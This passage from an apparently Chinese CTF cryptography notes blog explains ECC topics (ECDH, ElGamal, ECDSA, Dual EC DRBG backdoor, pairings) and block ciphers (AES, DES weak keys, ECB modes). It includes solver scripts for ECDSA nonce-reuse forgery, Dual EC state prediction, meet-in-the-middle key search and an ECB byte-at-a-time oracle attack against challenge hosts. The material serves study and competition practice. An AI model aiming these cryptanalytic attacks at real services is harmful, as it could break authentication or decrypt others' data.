[]remainders = []print(f&quot;[+] Running Pohlig Hellman&quot;)print(factors)for i, j in factors: if i &gt; 10**9: print(i) break mod = i**j g2 = G*(n//mod) q2 = QA*(n//mod) r = discrete_log(q2, g2, operation=&#x27;+&#x27;) remainders.append(r) moduli.append(mod) m *= modr = crt(remainders, moduli)print(r) 1234567891011121314151617#Sage Code 2E = EllipticCurve(GF(p), [a, b])P = E()Q = E()factors, exponents = zip(*factor(E.order()))primes = [factors[i] ^ exponents[i] for i in range(len(factors))][:-2]print(primes)dlogs = []for fac in primes: t = int(int(P.order()) // int(fac)) dlog = discrete_log(t*Q,t*P,operation=&quot;+&quot;) dlogs += [dlog] print(&quot;factor: &quot;+str(fac)+&quot;, Discrete Log: &quot;+str(dlog)) #calculates discrete logarithm for each prime orderl = crt(dlogs,primes)print(l) ​ ECDH椭圆曲线迪菲-赫尔曼密钥交换（英语：Elliptic Curve Diffie–Hellman key exchange，缩写为ECDH），是一种匿名的密钥合意协议（Key-agreement protocol），这是迪菲-赫尔曼密钥交换的变种，采用椭圆曲线密码学来加强性能与安全性。在这个协定下，双方利用由椭圆曲线密码学建立的公钥与私钥对，在一个不安全的通道中，建立起安全的共有加密资料。 ECDH一般来说交换的都是私钥，这个密钥一般作为“对称加密”的密钥而被双方在后续数据传输中使用。 ECDH是建立在这样一个前提之上的，给定椭圆曲线上的一个点 $P$，一个整数 $k$，求 $Q=kP$ 很容易；但是通过$Q,P$ 求解 $k$ 很难。 算法描述 A和B双方约定使用ECDH秘钥交换算法，这个时候双方也知道了ECDH算法里的一个大素数 $p$，这个 $p$ 可以看做是一个算法中的常量，$p$ 的位数决定了攻击者破解的难度。还有一个整数 $g$ 用来辅助整个秘钥交换，$g$ 不用很大，双方知道 $g$ 和 $p$ 之后就开始了ECDH交换秘钥的过程。 A知道了共用参数 $p$ 和 $g$，生成整数 $a$ 作为私钥，A利用 $p,g,a$ 通过公式 $g^a \\bmod p = A$ 生成 $A$ 作为公钥传递。 B通过链路收到A发来的 $p,g,A$，知道了A的公钥 $A$。这个时候B也生成自己的私钥 $b$，然后通过公式 $g^b \\bmod p = B$ 生成自己公钥 $B$。 在发送公钥 $B$ 前，B通过 $A^b \\bmod p = K$ 生成 $K$ 作为公共密钥，但是并不发送给A。 A收到B发来的公钥 $B$ 以后，同样通过 $B^a \\bmod p = K$ 生成公共密钥 $K$，这样A和B就通过不传递私钥 $a$ 和 $b$ 完成了对公共密钥 $K$ 的协商。 中间人只知道 $A$ 和 $B$ 以及椭圆曲线的公共参数，是无法算出共享密钥 $K$ 的。 这其实就是迪菲-赫尔曼问题：给定三个点 $P,aP,bP$，那么 $abP$ 的结果是什么？ 或者可以这么理解：给定三个整数 $k,k^x,k^y$，那么 $k^{xy}$ 的结果是什么？ 参考 ECDH秘钥协商算法原理 ECC椭圆曲线加密算法：ECDH 和 ECDSA 攻击 中间人攻击（MITM） 异或 Cryptography Dispatches: The Most Backdoor-Looking Bug I’ve Ever Seen Human-server - Union CTF 2021 ​ ECElGamal在密码学中，ElGamal加密算法是一个基于迪菲-赫尔曼密钥交换的非对称加密算法。GnuPG和PGP等很多密码学系统中都应用到了ElGamal算法。 ElGamal加密算法可以定义在任何循环群 $G$ 上。它的安全性取决于 $G$ 上的离散对数难题。 密钥生成 选取一条椭圆曲线 $\\text{E}_p(a,b)$，将明文消息 $m$ 嵌入到曲线上的点 $P_m$，再对点 $P_m$ 做加密变换。 取 $\\text{E}_p(a,b)$ 的一个生成元（基点） $G$， $\\text{E}_p(a,b)$ 和 $G$ 作为公开参数。 A选 $n_A$ 作为密钥，以 $P_A=n_AG$ 作为公钥。 加密过程 用户B向A发送消息 $P_m$，选取一个随机的正整数 $k$，产生以下点对作为密文： $C_m=(kG,P_m+kP_A)$。 解密过程 A以密文点对中的第二个点，减去用自己的密钥与第一个点的倍乘，即： $P_m+kP_A-n_AkG=P_m+k(n_AG)-n_AkG=P_m$。 ​ ECDSA椭圆曲线数字签名算法（英语：Elliptic Curve Digital Signature Algorithm，缩写：ECDSA）是一种基于椭圆曲线密码学的公开密钥加密算法。 ECDSA是DSA作用于椭圆曲线的一个变种算法。A和B仍然使用同样的曲线，ECDSA需要使用明文的哈希结果，而不是明文本身。哈希函数的选择取决于使用者，但是需要明确的是必须选择加密安全的哈希函数。 场景：Alice 想要使用她的私钥 $d_A$ 来签名，Bob 想用 Alice 的公钥 $H_A$ 要验证签名（$H_A=d_AG$），只有 Alice 才能提供正确的签名，而每个人都可以验证签名。 签名过程 A使用算法来签名的步骤： 选取一条椭圆曲线 $\\text{E}_p(a,b)$； 选取一个随机数 $k\\quad (k\\in[1,n-1])$ (Nonce)，$n$ 为 $\\text{E}_p(a,b)$ 的阶； 选取 $\\text{E}_p(a,b)$ 的一个基点 $G$，计算点 $K=kG$，坐标表示为 $K=(x_K,y_K)$； 计算数字 $r=x_K \\bmod n$； 如果 $r=0$，另选一个 $k$ 并重新计算； 获取数据 $M$ 的Hash值，记为$z=\\text{Hash}(M)$，计算 $s=k^{-1}(z+rd_A) \\bmod n$； 如果 $s=0$，另选一个 $k$ 并重新计算； 输出签名 $(r,s)$。 通俗的说，这个算法一开始生成了 $k$，得益于点乘，$k$ 被隐藏在了 $r$ 中，然后通过 $s$ 的等式将 $r$ 绑定到了消息散列值 $z$ 上。 为了计算 $s$，必须计算 $k^{-1} \\bmod n$，只有在 $n$ 是素数的情况下才能保证这一过程，如果子群的阶不是一个素数，ECDSA 将不起作用。 验证过程 为了验证签名，需要A的公钥 $H_A$、哈希值 $z$ 和签名 $(r,s)$。 计算整数 $u_1=s^{-1}z \\bmod n$； 计算整数 $u_2=s^{-1}r \\bmod n$； 计算点 $P=u_1G+u_2H_A=(s^{-1}zG+s^{-1}rH_A) \\bmod n=s^{-1}G(z+rd_A) \\bmod n$； 只有当 $r=x_P \\bmod n$ 的时候，签名才被成功验证。 参考 ECDSA数字签名算法 ECC椭圆曲线加密算法：ECDH 和 ECDSA 攻击 $k$ 复用（共享 $k$） ECDSA: Handle with Care 参考DSA攻击。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192from gmpy2 import invertfrom hashlib import sha256, sha1from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport string, randomimport ecdsacontext(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)HOST = &quot;127.0.0.1&quot;PORT = 10305r = remote(HOST, PORT)def brute_force(prefix,s): return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=4,method=&#x27;fixed&#x27;)def recv(keepends=False): return r.recvline(keepends=keepends).strip()def send(anti, msg): r.sendlineafter(anti, msg)def sendHash(): context = recv() prefix, s = parse(&quot;sha256(XXXX+&#123;&#125;) == &#123;&#125;&quot;,context) proof = brute_force(prefix,s) send(&quot;Give me XXXX:&quot;, proof)def getMessage(): recv() recv() msg1 = recv()[-64:] msg2 = recv()[-64:] return msg1, msg2def calculator(msg1, msg2): curve = ecdsa.curves.SECP256k1 G = curve.generator n = G.order() r = 0 while r == 0: random_k = ecdsa.util.randrange(n) k = random_k % n ks = k + n kt = ks + n if ecdsa.util.bit_length(ks) == ecdsa.util.bit_length(n): p1 = kt * G else: p1 = ks * G r = p1.x() % n h1 = ecdsa.util.string_to_number(sha1(msg1).digest()) % n h2 = ecdsa.util.string_to_number(sha1(msg2).digest()) % n x = ((-(h1 + h2)) * invert(2*r, n)) % n prikey = ecdsa.SigningKey.from_secret_exponent(x, ecdsa.curves.SECP256k1, hashfunc=sha1) pubkey = prikey.get_verifying_key() send(&quot;Please choice your options:&quot;, &quot;3&quot;) send(&quot;Please give me your public_key(hex):&quot;, pubkey.to_string().encode(&#x27;hex&#x27;)) sign = prikey.sign(msg1, k = k) send(&quot;Please choice your options:&quot;, &quot;5&quot;) send(&quot;Please give me the message(hex):&quot;, msg1.encode(&#x27;hex&#x27;)) send(&quot;Please give me the signature(hex):&quot;, sign.encode(&#x27;hex&#x27;)) if &quot;Verify successfully!&quot; in recv(): print (&quot;msg1 verify successfully!&quot;) send(&quot;Please choice your options:&quot;, &quot;5&quot;) send(&quot;Please give me the message(hex):&quot;, msg2.encode(&#x27;hex&#x27;)) send(&quot;Please give me the signature(hex):&quot;, sign.encode(&#x27;hex&#x27;)) if &quot;Verify successfully!&quot; in recv(): print (&quot;msg2 verify successfully!&quot;) send(&quot;Please choice your options:&quot;, &quot;6&quot;) send(&quot;Please give me the signature(hex) of the frist message:&quot;, sign.encode(&#x27;hex&#x27;)) send(&quot;Please give me the signature(hex) of the second message:&quot;, sign.encode(&#x27;hex&#x27;))def main(): sendHash() msg1, msg2 = getMessage() calculator(msg1, msg2) r.recvuntil(&quot;&#125;&quot;) r.close()if __name__ == &#x27;__main__&#x27;: main() $k$ 部分泄露+多组 $(r,s)$ 签名 ECDSA: Handle with Care Recovering cryptographic keys from partial Pbctf 2020 - LeaK DownUnderCTF 2020 - impECCable L3HCTF - EzECDSA LLL算法。 $k$ 低位相同+多组 $(r,s)$ 签名 GFCTF2021 - Wtfcrypto ​ Dual EC DRBG双椭圆曲线确定性随机数发生器（Dual_EC_DRBG），也被称作双椭圆曲线随机数发生器，是一种使用椭圆曲线密码学实现的密码学安全伪随机数发生器（CSPRNG）。它的设计者是 NSA，2006 年它被 NIST 作为标准，到 2014 年被移除。 攻击 后门原理： $P=dQ$ 关系中的 $d$ 如果被攻击者知道了，那么攻击者就可以利用 $d$ 构造出之后每一步的 $\\text{state}$，从而可以成功预测每一步的 $r_i$，这个随机数生成器也就被攻破了。 设每一步的 $\\text{state}$ 为 $s_i$，随机数为 $r_i$，随机数对应的椭圆曲线上的点为 $R_i$。 那么对于攻击者来说，已知 $P$、$Q$、$d$、$R_i$，而 $s_i$ 未知。于是有： $\\begin{cases} ((s_i \\cdot P)_x \\cdot P)_x &amp; \\rightarrow s_{i+1} \\newline ((s_i \\cdot P)_x \\cdot Q)_x &amp; \\rightarrow r_i \\end{cases}$ 显然，我们需要求得某一步的 $s_i$，那么之后每一步的 $s_i$ 就都知道了，从而之后的 $r_i$ 我们也都可以预测了。 而论文里的后门就是构造 $d \\cdot r_{i-1}$，其恰好是 $s_i$，于是看似安全的体制就被攻破了。 记 $k_i = (s_i \\cdot P)_x$，有： $\\begin{align} d \\cdot r_{i-1} &amp; = {(d \\cdot R_{i-1})_x = (d \\cdot k_{i-1} \\cdot Q)_x} = {(k_{i-1} \\cdot d \\cdot Q)_x = (k_{i-1} \\cdot P)_x} = {((s_{i-1} \\cdot P)_x \\cdot P)_x = s_i} \\end{align}$ 12345678910111213141516171819202122232425def do_next(s): sP = s * P r = Integer(sP[0]) s_new = Integer((r * P)[0]) rQ = r * Q return Integer(rQ[0]), s_newdef do_guess(r1): try: rQ1 = E.lift_x(r1) except ValueError: return None sP2 = d * rQ1 s2 = Integer(sP2[0]) r2, s3 = do_next(s2) return r2, s3 for i in tqdm(range(256)): r1_guess = (r1 &lt;&lt; 8) + i res = do_guess(r1_guess) if res: r2_guess, s3 = res if r2_guess &gt;&gt; 8 == r2: r3, s4 = do_next(s3) break 参考 Dual EC: A Standardized Back Door UTCTF 2021 - Sleeves ​ EC-LCG给出ECC的7个点的 $x$ 坐标值，满足 $X_i=X_{i-1}+b$，得到关于 $x_b,a,b$ 三个未知数有关的方程，一共6个方程，用Gröbner基求解 $C=kp$。 参考 PREDICTING THE ELLIPTIC CURVE CONGRUENTIAL GENERATOR RCTF 2022 - IS_THIS_LCG? ​ 双线性配对 (Pairing)双线性配对指的是两个不同群的元素映射到第三个群的元素的映射关系，写作数学符号是：$G_1\\times G_2\\Rightarrow G_3$。 Weil配对Weil 配对 (Weil Pairing) 是一个有良好性质的，对椭圆群元素起作用的双线性映射。 其定义为，对一个椭圆曲线中的两点 $P,Q$，其中椭圆曲线的阶为 $m$，那么其 Weil 配对表示为 $e_m(P,Q)$，并且满足： $\\begin{align}e_m(P_1+P_2,Q)=e_m(P_1,Q)e_m(P_2,Q)\\\\e_m(P,Q_1+Q_2)=e_m(P,Q_1)e_m(P,Q_2)\\end{align}$ 而其中，$e_m(P,Q)=\\cfrac{f_P(Q+S)}{f_P(S)}/\\cfrac{f_Q(P-S)}{f_Q(-S)}$ $S$ 是任意椭圆曲线中的元素且 $S \\notin \\{O,P,−Q,P−Q\\}$，只做中间计算；$f_P,f_Q$ 是任意有理函数。$e_m(P,Q)$ 的值与 $f_P,f_Q,S$ 的选取无关。 可以证明的是，$e_m(P,Q)^m=1$ 恒定，即 $e_m(P,Q)$ 一定是 $m$ 次单位根。 性质 $e_m(P_1+P_2,Q)=e_m(P_1,Q)e_m(P_2,Q)$ $e_m(P,Q_1+Q_2)=e_m(P,Q_1)e_m(P,Q_2)$ $e_m(P,P)=1$ $e_m(P,Q)=e_m(Q,P)^{-1}$ Tate配对Tate 配对的计算效率要比 Weil 配对效率高，定义为：$\\tau(P,Q)=\\cfrac{f_P(Q+S)}{f_P(S)}$ 与 Weil 配对的关系为：$e_l(P,Q)=\\cfrac{\\tau(P,Q)}{\\tau(Q,P)}$，计算量约为 Tate 配对的两倍。 ​ ECDDHP椭圆曲线上的DDH问题（Elliptic Curve Decisional Diffie-Hellman Problem，ECDDHP）。 双线性对满足 $e(aG,bG)=e(G,abG)$。 如果随便选一个椭圆曲线点群，ECDDH假设通常是不成立的，并且攻击方法就很简单：看等式 $e(aG,bG)=e(G,abG)$ 是否成立。 123456789101112131415161718192021222324252627282930313233343536373839404142434445# sageDDH_instances = []# curvep = K = GF(p)a = b = E = EllipticCurve(K, (a, b))G = n = G.order()# Embedding degree of the curvek = def solve_ECDDHP(DDH_instances, G, Ep, m, n): &quot;&quot;&quot; Parameters: DDH_instances - list consists of (aG, bG, cG), where aG, bG, cG are EC_point.xy() m - embedding degree of &lt;G&gt; n - G&#x27;s order. &quot;&quot;&quot; sols = [] Fpm.&lt;x&gt; = GF(p^m) Epm = Ep.base_extend(Fpm) G = Epm(G) for ins in DDH_instances: aG, bG, cG = ins aG = Epm(aG); bG = Epm(bG); cG = Epm(cG) # e_aG_bG = aG.weil_pairing(bG, n) e_aG_bG = aG.tate_pairing(bG, n, m) e_G_cG = G.tate_pairing(cG, n, m) if e_aG_bG == e_G_cG: sols.append(True) else: sols.append(False) return solssols = solve_ECDDHP(DDH_instances, G, E, k, n) ​ 标准椭圆曲线参数NIST P-25612345678910NIST_256 = ( NIST_256_P := 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff, NIST_256_K := GF(NIST_256_P), NIST_256_A := NIST_256_K(0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc), NIST_256_B := NIST_256_K(0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b), NIST_256_CURVE := EllipticCurve(NIST_256_K, (NIST_256_A, NIST_256_B)), NIST_256_GEN := NIST_256_CURVE(0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296, 0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5), NIST_256_ORDER := 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551 * 0x1)NIST_256_CURVE.set_order(NIST_256_ORDER) NIST P-51212345678910NIST_521 = ( NIST_521_P := 0x01ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, NIST_521_K := GF(NIST_521_P), NIST_521_A := NIST_521_K(0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc), NIST_521_B := NIST_521_K(0x0051953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00), NIST_521_CURVE := EllipticCurve(NIST_521_K, (NIST_521_A, NIST_521_B)), NIST_521_GEN := NIST_521_CURVE(0x00c6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66, 0x011839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650), NIST_521_ORDER := 0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa51868783bf2f966b7fcc0148f709a5d03bb5c9b8899c47aebb6fb71e91386409 * 0x1)NIST_512_CURVE.set_order(NIST_512_ORDER)","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"ECC","slug":"ECC","permalink":"https://lazzzaro.github.io/tags/ECC/"}],"author":"Lazzaro"},{"title":"块密码","slug":"crypto-块密码","date":"2020-11-07T10:37:27.000Z","updated":"2024-03-21T16:40:40.692Z","comments":true,"path":"2020/11/07/crypto-块密码/","permalink":"https://lazzzaro.github.io/2020/11/07/crypto-%E5%9D%97%E5%AF%86%E7%A0%81/","excerpt":"","text":"​ 块密码/分组密码在密码学中，分组加密（英语：Block cipher），又称分块加密或块密码，是一种对称密钥算法。它将明文分成多个等长的模块（block），使用确定的算法和对称密钥对每组分别加密解密。分组加密是极其重要的加密协议组成，其中典型的如AES和3DES作为美国政府核定的标准加密算法，应用领域从电子邮件加密到银行交易转帐，非常广泛。 分组加密包含两个成对的算法：加密算法 $E$ 和解密算法 $D$，两者互为反函数。每个算法有两个输入：长度为 $n$ 位的组，和长度为 $k$ 位的密钥；两组输入均生成 $n$ 位输出。将两个算法看作函数，$K$ 表示长度为 $k$ 的密钥（密钥长度），$P$ 表示长度为 $n$ 的分组，$P$ 也被表示为明文，$C$ 表示密文，则满足： $E_K(P) = C \\; ; \\quad E_K^{-1}(C)=P$ $E_K(P) := E(K,P): \\{0,1\\}^k \\times \\{0,1\\}^n \\rightarrow \\{0,1\\}^n,$ 对于任意密钥 $K$，$E_K(P)$ 是输入的组的一个置换函数，且可逆地落在 $\\{0,1\\}^n$ 区间。$E$ 的反函数（解密算法）定义为： $E_K^{-1}(C) := D_K(C) = D(K,C): \\{0,1\\}^k \\times \\{0,1\\}^n \\rightarrow \\{0,1\\}^n,$ 例如，一个分组加密算法使用一段 128 位的分组作为明文，相应输出 128 位的密文；而其转换则受加密算法中第二个输入的控制，也就是密钥 $k$。解密算法类似，使用 128 位的密文和对应的密钥，得到原 128 位的明文。 每一个密钥实际上是选择了 $n$ 位输入排列的 $(2^n)!$ 种组合中的一种。 大多数的分组密码在在加密算法中会重复使用某一函数进行多轮运算，典型的轮数在4-32次之间，每一轮的函数R使用不同的子密钥 $K_i$，由原密钥生成，作为输入： $M_i = R_{K_i}(M_{i-1})$ 其中 $M_{0}$ 是最初的明文，$M_{i}$ 是第 $i$ 轮加密后的密文。 ​ AES高级加密标准（英语：Advanced Encryption Standard，缩写：AES），又称Rijndael加密法，是美国联邦政府采用的一种区块加密标准。这个标准用来替代原先的DES，已经被多方分析且广为全世界所使用。经过五年的甄选流程，高级加密标准由美国国家标准与技术研究院（NIST）于2001年11月26日发布于FIPS PUB 197，并在2002年5月26日成为有效的标准。现在，高级加密标准已然成为对称密钥加密中最流行的算法之一。 该算法为比利时密码学家Joan Daemen和Vincent Rijmen所设计，结合两位作者的名字，以Rijndael为名投稿高级加密标准的甄选流程。 加密方法 严格地说，AES和Rijndael加密法并不完全一样（虽然在实际应用中两者可以互换），因为Rijndael加密法可以支持更大范围的区块和密钥长度：AES的区块长度固定为128比特，密钥长度则可以是128，192或256比特；而Rijndael使用的密钥和区块长度均可以是128，192或256比特。加密过程中使用的密钥是由Rijndael密钥生成方案产生。 大多数AES计算是在一个特别的有限域完成的。 AES加密过程是在一个4×4的字节矩阵上运作，这个矩阵又称为“体（state）”，其初值就是一个明文区块（矩阵中一个元素大小就是明文区块中的一个Byte）。（Rijndael加密法因支持更大的区块，其矩阵的“列数（Row number）”可视情况增加）加密时，各轮AES加密循环（除最后一轮外）均包含4个步骤： AddRoundKey 矩阵中的每一个字节都与该次回合密钥（round key）做XOR运算；每个子密钥由密钥生成方案产生。 SubBytes 透过一个非线性的替换函数，用查找表的方式把每个字节替换成对应的字节。 ShiftRows 将矩阵中的每个横列进行循环式移位。 MixColumns 为了充分混合矩阵中各个直行的操作。这个步骤使用线性转换来混合每内联的四个字节。最后一个加密循环中省略MixColumns步骤，而以另一个AddRoundKey取代。 123456789101112131415161718192021222324252627282930313233343536//Java实现import java.io.*;import javax.crypto.spec.SecretKeySpec;import java.security.MessageDigest;import java.util.Arrays;import javax.crypto.Cipher;class test &#123; public static void main (String[] args) throws java.lang.Exception &#123; byte[] plain = &quot;flag&#123;xxxxxxxxx&#125;&quot;.getBytes(); System.out.println(Arrays.toString(plain)); byte[] key = &#123;-114, 62, 98, 26, 54, -7, -59, -47, 55, 88, 18, -1, -99, 116, -51, 62&#125;; SecretKeySpec secretKeySpec = new SecretKeySpec(key, 0, key.length, &quot;AES&quot;); MessageDigest instance = MessageDigest.getInstance(&quot;SHA-256&quot;); instance.reset(); byte[] digest = instance.digest(plain); Cipher instance2 = Cipher.getInstance(&quot;AES/ECB/NoPadding&quot;); instance2.init(1, secretKeySpec); byte[] cipher = instance2.doFinal(digest); System.out.println(Arrays.toString(cipher)); byte[] c = &#123;11, -35, 55, 10, 62, 79, 125, 62, -28, 115, 77, 4, 73, 0, 11, 121, -126, 85, -83, 109, 1, -98, 35, -68, -4, -122, 14, 110, -28, 111, 22, -125&#125;; secretKeySpec = new SecretKeySpec(key, 0, key.length, &quot;AES&quot;); instance2 = Cipher.getInstance(&quot;AES/ECB/NoPadding&quot;); instance2.init(2, secretKeySpec); byte[] p = instance2.doFinal(c); System.out.println(Arrays.toString(p)); String out = Base64.getEncoder().encodeToString(p); System.out.println(out); &#125;&#125; ​ DES数据加密标准（英语：Data Encryption Standard，缩写为 DES）是一种对称密钥加密块密码算法，1976年被美国联邦政府的国家标准局确定为联邦资料处理标准（FIPS），随后在国际上广泛流传开来。它基于使用56位密钥的对称算法。这个算法因为包含一些机密设计元素，相对短的密钥长度以及怀疑内含美国国家安全局（NSA）的后门而在开始时有争议，DES因此受到了强烈的学院派式的审查，并以此推动了现代的块密码及其密码分析的发展。 DES现在已经不是一种安全的加密方法，主要因为它使用的56位密钥过短。 加密方法 DES是一种典型的块密码—一种将固定长度的明文通过一系列复杂的操作变成同样长度的密文的算法。对DES而言，块长度为64位。同时，DES使用密钥来自定义变换过程，因此算法认为只有持有加密所用的密钥的用户才能解密密文。密钥表面上是64位的，然而只有其中的56位被实际用于算法，其余8位可以被用于奇偶校验，并在算法中被丢弃。因此，DES的有效密钥长度仅为56位。 算法的整体结有16个相同的处理过程，称为“回次”（round），并在首尾各有一次置换，称为IP与FP（或称IP-1，FP为IP的反函数（即IP“撤销”FP的操作，反之亦然）。IP和FP几乎没有密码学上的重要性，为了在1970年代中期的硬件上简化输入输出数据库的过程而被显式的包括在标准中。 在主处理回次前，数据块被分成两个32位的半块，并被分别处理；这种交叉的方式被称为费斯妥结构。费斯妥结构保证了加密和解密过程足够相似—唯一的区别在于子密钥在解密时是以反向的顺序应用的，而剩余部分均相同。这样的设计大大简化了算法的实现，尤其是硬件实现，因为没有区分加密和解密算法的需要。 费斯妥函数（F函数）将数据半块与某个子密钥进行处理。然后，一个F函数的输出与另一个半块异或之后，再与原本的半块组合并交换顺序，进入下一个回次的处理。在最后一个回次完成时，两个半块需要交换顺序，这是费斯妥结构的一个特点，以保证加解密的过程相似。 费斯妥函数（F函数）每次对半块（32位）进行操作，并包括四个步骤： 扩张 用扩张置换将32位的半块扩展到48位，其输出包括8个6位的块，每块包含4位对应的输入位，加上两个邻接的块中紧邻的位。 与密钥混合 用异或操作将扩张的结果和一个子密钥进行混合。16个48位的子密钥—每个用于一个回次的F变换—是利用密钥调度从主密钥生成的。 S盒 在与子密钥混合之后，块被分成8个6位的块，然后使用“S盒”，或称“置换盒”进行处理。8个S盒的每一个都使用以查找表方式提供的非线性的变换将它的6个输入位变成4个输出位。S盒提供了DES的核心安全性—如果没有S盒，密码会是线性的，很容易破解。 置换 最后，S盒的32个输出位利用固定的置换，“P置换”进行重组。这个设计是为了将每个S盒的4位输出在下一回次的扩张后，使用4个不同的S盒进行处理。 S盒，P置换和E扩张各自满足了克劳德·香农在1940年代提出的实用密码所需的必要条件，“混淆与扩散”。 弱密钥在DES的计算中，56bit的密钥最终会被处理为16个轮密钥，每一个轮密钥用于16轮计算中的一轮，DES弱密钥会使这16个轮密钥完全一致，所以称为弱密钥。 四个弱密钥： 1234\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\\xE0\\xE0\\xE0\\xE0\\xF1\\xF1\\xF1\\xF1\\x1F\\x1F\\x1F\\x1F\\x0E\\x0E\\x0E\\x0E 如果不考虑校验位的密钥，以下也属于弱密钥： 1234\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xE1\\xE1\\xE1\\xE1\\xF0\\xF0\\xF0\\xF0\\x1E\\x1E\\x1E\\x1E\\x0F\\x0F\\x0F\\x0F 如果使用弱密钥，PC1计算的结果会导致轮密钥全部为0、全部为1或全部01交替。因为所有的轮密钥都是一样的，并且DES是 Feistel网络的结构，这就导致加密函数是自反相 (self-inverting) 的，结果就是加密一次看起来没什么问题，但是如果再加密一次就得到了明文。 部分弱密钥部分弱密钥是指只会在计算过程中产生两个不同的子密钥，每一个在加密的过程中使用8次。这就意味着这对密钥$k_1$ 和 $k_2$ 有如下性质：$E_{k_1}(E_{k_2}(M))=M$。 6个常见的部分弱密钥对： 1234560x011F011F010E010E + 0x1F011F010E010E010x01E001E001F101F1 + 0xE001E001F101F1010x01FE01FE01FE01FE + 0xFE01FE01FE01FE010x1FE01FE00EF10EF1 + 0xE01FE01FF10EF10E0x1FFE1FFE0EFE0EFE + 0xFE1FFE1FFE0EFE0E0xE0FEE0FEF1FEF1FE + 0xFEE0FEE0FEF1FEF1 ​ 加解密工具 openssl加密： openssl enc -aes-128-cbc -in plain.txt -out encrypt.txt -iv f123 -K 1223 -p -p: 打印加密用的salt,key,iv 解密： openssl aes-128-cbc -d -in encrypt.txt -out encrypt_decrypt.txt -S E0DEB1EAFE7F0000 -iv F1230000000000000000000000000000 -K 12230000000000000000000000000000 openssl enc -d -aes256 -in fl@g.txt -out 1.txt -S: salt ​ 模式攻击ECB模式最简单的加密模式即为电子密码本（Electronic codebook，ECB）模式。需要加密的消息按照块密码的块大小被分为数个块，并对每个块进行独立加密。 中间人攻击（MITM）假如存在一个攻击者，当他作为中间人截获两方的通信时，他能够改变密文的分组顺序，当接收者对密文进行解密时，由于密文分组的顺序被改变了，因此相应的明文分组的顺序也被改变了，那么接收者实际上是解密出了一段被篡改后的密文。在这种场景中，攻击者不需要破译密码，也不需要知道分组密码的算法，他只需要知道哪个分组记录了什么样的数据。 参考：Boston Key Party CTF 2013 - MITM 123456789101112131415161718192021222324252627282930#python2from Crypto.Cipher import AESfrom binascii import hexlify,unhexlifyfrom string import printablealph = printablem = &#x27;&#x27;c = &#x27;&#x27;flag_c = &#x27;&#x27;middle = dict();for x in alph: for y in alph: for z in alph: key1 = &#x27;%s%s%s%s&#x27; % (&#x27;0&#x27; * 13, x, y, z) cipher = AES.new(key1) middle.update(&#123;cipher.encrypt(m): key1&#125;)print &quot;\\nTable built...\\n&quot;;for x in alph: for y in alph: for z in alph: key2 = &#x27;%s%s%s%s&#x27; % (x, y, z, &#x27;0&#x27; * 13) cipher = AES.new(key2) d = cipher.decrypt(c) if d in middle: print &quot;\\nKeys found: %s; %s\\nFlag:&quot; % (middle[d].encode(&#x27;hex&#x27;), key2.encode(&#x27;hex&#x27;)) cipher1 = AES.new(middle[d]) print cipher1.decrypt(cipher.decrypt(flag_c)) 模式攻击动态填充加密+枚举secret字符 方法一 1.明文由输入值m+flag+padding组成，$m$ 为空时， $c$ 可分 $k$ 块，不断调整 $m$ 的长度，直到 $m$ 长度为 $l+1$ 时 $c$ 可分 $k+1$ 块，那么说明 $m$ 长度为 $l$ 时 $c$ 刚好可分 $k$ 块，即无padding情况下，$m+flag$ 可分 $k$ 块，则flag长度即为 $8k-l$。 2.利用上面的思想，在 $m$ 长度为 $l$ 的基础上，长度不断加1，则可以把flag从后开始的每一位推到下一个块中，得到下一个块的密文 $c_i$； 3.又已爆破出的flag位+padding已知，则下一个块的构成为未知字符1位+已爆破出的flag位(+padding)； 4.根据DES-ECB的性质，相同明文块对应的密文块相同。爆破第一位未知字符，将上面的块构成作为输入值输入，得到对应的密文的第一块，分别与实际密文 $c_i$ 比较，匹配的即为正确的明文字符。 5.以此类推，得到完整flag。 参考： ECB模式攻击 1024杯 - 密码系统 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *import gmpy2import stringhost = &#x27;das.wetolink.com&#x27;port = 42887block = 16secret_len = 38ori_padding_len = 10dic = &#x27;&#123;&#125;-&#x27;+string.ascii_lowercase+string.digitsp = connect(host,port)flag = &#x27;&#x27;def pad(leng): pad_len = block - (leng % block) if leng % block != 0 else 0 return chr(pad_len) * pad_lenpadding = [pad(k) for k in range(16)]padding = padding[1:]+[padding[0]]for i in range(secret_len): find=0 payload = (&#x27;*&#x27;*(ori_padding_len+i+1)).encode(&#x27;hex&#x27;) group = i//block p.recvuntil(&#x27;Amazing function: &#x27;) p.sendline(payload) data = p.recvline().strip() print([data[i:i+32] for i in range(0,len(data),32)]) print(data) if group == 0: prob=data[-32:] else: 